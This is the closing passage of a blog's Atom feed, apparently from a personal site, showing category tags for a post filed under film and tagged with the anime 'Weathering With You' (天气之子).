      <category term="电影" scheme="https://www.nikoyu.asia/categories/%E6%83%85%E6%84%9F%E7%94%9F%E6%B4%BB/%E7%94%B5%E5%BD%B1/"/>
    
    
      <category term="天气之子" scheme="https://www.nikoyu.asia/tags/%E5%A4%A9%E6%B0%94%E4%B9%8B%E5%AD%90/"/>
    
  </entry>
  
</feed>
